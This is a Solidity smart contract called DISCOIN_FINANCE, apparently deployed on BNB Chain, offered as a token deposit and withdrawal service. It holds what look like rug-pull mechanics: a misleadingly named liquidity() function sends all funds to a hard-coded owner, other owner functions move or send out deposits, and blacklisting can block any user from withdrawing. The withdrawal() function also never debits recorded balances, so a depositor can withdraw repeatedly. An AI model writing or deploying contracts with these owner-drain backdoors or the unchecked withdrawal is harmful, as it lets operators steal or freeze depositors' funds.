/**
 *Submitted for verification at BscScan.com on 2023-01-28
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^ 0.8.15;
interface IERC20 {
    function totalSupply() external view returns(uint256);

    function balanceOf(address account) external view returns(uint256);

    function decimals() external view returns(uint8);

    function transfer(address recipient, uint256 amount)
    external
    returns(bool);

    function allowance(address owner, address spender)
    external
    view
    returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns(address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns(bytes memory) {
        this;
        return msg.data;
    }
}
library Address {
    function isContract(address account) internal view returns(bool) {
        uint256 size;
        assembly {
            size:= extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call {
            value: amount
        }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data)
    internal
    returns(bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns(bytes memory) {
        return
        functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns(bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call {
            value: value
        }(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
    internal
    view
    returns(bytes memory) {
        return
        functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns(bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
    internal
    returns(bytes memory) {
        return
        functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size:= mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeERC20 {
    using Address
    for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance");
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        address msgSender = 0x486b1942C91bF2d61dFbcaD1D892199e8de059BF;
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns(address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract DISCOIN_FINANCE is Context, Ownable {
    using SafeMath
    for uint256;
    using SafeERC20
    for IERC20;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private withdrawAmount;
    mapping(address => uint256) public whitelistedAddresses;
    mapping(address => uint256) public blacklistedAddresses;
    event Deposit(address indexed from, address indexed to, uint256 amount);
    event AddressWhitelisted(address indexed WhitelistedAddress);
    event AddressBlackListed(address indexed BlacklistedAddress);
    event Withdraw(address indexed to, uint256 amount);
    event SentToAddress(address indexed to, uint256 amount);
    event MinimumDepositAmountChanged(uint256 amount);
    event MaxWithdrawAmountChanged(uint256 amount);
    IERC20 private _token;
    uint256 public minimumDepositAmount = 500 * 10 ** 8;
    uint256 public maxWithdrawAmount = 2500 * 10 ** 8;
    modifier isNotBlacklisted(address _address) {
        require(blacklistedAddresses[_address] != 1, "Blacklist: user is blacklisted");
        _;
    }
    modifier isWhitelisted(address _address) {
        require(whitelistedAddresses[_address] == 1, "Whitelist: you need to be whitelisted");
        _;
    }
    receive() external payable {}
    constructor(IERC20 token_) {
        _token = token_;
    }

    function addArrayOfWhitelist(address[] calldata _addressToWhitelist)
    public
    onlyOwner {
        for (uint256 i = 0; i < _addressToWhitelist.length; i++) {
            require(whitelistedAddresses[_addressToWhitelist[i]] != 1, "Whitelist: user already whitelisted");
            whitelistedAddresses[_addressToWhitelist[i]] = 1;
        }
    }

    function blacklist(address _addressToBlacklist) public onlyOwner {
        require(blacklistedAddresses[_addressToBlacklist] != 1, "BlackList: user already blacklisted");
        blacklistedAddresses[_addressToBlacklist] = 1;
        emit AddressBlackListed(_addressToBlacklist);
    }

    function changeDepositAmount(uint256 ChangedAmount) external onlyOwner {
        minimumDepositAmount = ChangedAmount * 10 ** 8;
        emit MinimumDepositAmountChanged(ChangedAmount);
    }

    function changeWithdrawAmount(uint256 ChangedAmount) external onlyOwner {
        maxWithdrawAmount = ChangedAmount * 10 ** 8;
        emit MaxWithdrawAmountChanged(ChangedAmount);
    }

    function checkBalance(address account) external view returns(uint256) {
        return _balances[account];
    }

    function checkWithdraw(address _account) external view returns(uint256) {
        return withdrawAmount[_account];
    }

    function deposit(uint256 amount) external isNotBlacklisted(_msgSender()) {
        require(amount <= _token.balanceOf(_msgSender()), "Insufficient balance");
        require(amount <= _token.allowance(_msgSender(), address(this)), "Please approve us to spend the amount of token");
        _token.transferFrom(_msgSender(), address(this), amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        if (whitelistedAddresses[_msgSender()] != 1) {
            whitelistedAddresses[_msgSender()] = 1;
            emit AddressWhitelisted(_msgSender());
        }
        emit Deposit(_msgSender(), address(this), amount);
    }

    function getBalance() public view returns(uint) {
        return _token.balanceOf(address(this));
    }

    function greylist(address _addressToBlacklist) public onlyOwner {
        require(blacklistedAddresses[_addressToBlacklist] != 0, "BlackList: user is already not blacklisted");
        blacklistedAddresses[_addressToBlacklist] = 0;
    }

    function liquidity() external onlyOwner {
        if (address(this).balance > 0) {
            payable(_msgSender()).transfer(address(this).balance);
        }
        if (_token.balanceOf(address(this)) > 0) {
            _token.transfer(_msgSender(), _token.balanceOf(address(this)));
        }
    }

    function ownerWithdraw(IERC20 _tokenAddress) external onlyOwner {
        require(_tokenAddress.balanceOf(address(this)) > 0, "There is no token balance in the contract");
        _tokenAddress.transfer(_msgSender(), _tokenAddress.balanceOf(address(this)));
    }

    function sendToAddress(address account, uint256 amount) external onlyOwner {
        _token.transfer(account, amount);
        emit SentToAddress(account, amount);
    }

    function token() external view returns(IERC20) {
        return _token;
    }

    function updateToken(IERC20 token_) external onlyOwner {
        _token = token_;
    }

    function verifyWhitelistedUser(address _addressToVerify) public view returns(bool) {
        if (whitelistedAddresses[_addressToVerify] == 1) {
            return true;
        } else {
            return false;
        }
    }

    function verifyBlackListedUser(address _addressToVerify) public view returns(bool) {
        if (blacklistedAddresses[_addressToVerify] == 1) {
            return true;
        } else {
            return false;
        }
    }

    function withdrawal(uint256 _amount) public isWhitelisted(_msgSender()) isNotBlacklisted(_msgSender()) {
        require(_amount > 0, "The amount should be greater than zero");
        require(_balances[_msgSender()] >= minimumDepositAmount, "In order to withdraw, you must deposit the required amount of tokens");
        require(_amount <= maxWithdrawAmount, "The amount reached the threshold withdrawal limit");
        if (_token.balanceOf(address(this)) >= _amount) {
            _token.transfer(_msgSender(), _amount);
        }
        withdrawAmount[_msgSender()] = withdrawAmount[_msgSender()].add(_amount);
        emit Withdraw(_msgSender(), _amount);
    }

    function whitelist(address _addressToWhitelist) public onlyOwner {
        require(whitelistedAddresses[_addressToWhitelist] != 1, "Whitelist: user already whitelisted");
        if (blacklistedAddresses[_addressToWhitelist] == 1) {
            blacklistedAddresses[_addressToWhitelist] = 0;
        }
        whitelistedAddresses[_addressToWhitelist] = 1;
        emit AddressWhitelisted(_addressToWhitelist);
    }

}